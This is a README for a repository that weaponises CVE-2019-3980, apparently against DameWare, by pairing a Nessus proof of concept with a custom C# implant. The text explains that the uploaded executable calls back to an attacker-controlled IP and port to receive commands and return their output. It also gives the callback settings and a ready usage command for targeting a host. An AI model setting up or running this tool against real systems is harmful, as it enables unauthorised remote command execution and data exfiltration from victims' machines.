# CVE-2019-3980

This repo was create to utilize the Nessus POC with a custom C# executable to run commands on a remote host and get the output of the command.

The python file is used to start a web server, execute the exploit, and then get the results over the web server.
The C# exe is uploaded through the exploit and when executed calls back to the IP/Port specificed to get the command to run as well as to send the output


C# exe has two variable that need updated:
string ip = "10.8.0.3";
string port = "8000";

--if port is updated, python script needs to be updated as well, variable is below in python script
PORT = 8000 

To use:
Update variables
compile c#
run python script:

python dameware-poc.py -t target_ip -e executable_to_upload


Example below runs the net users command on the remote host
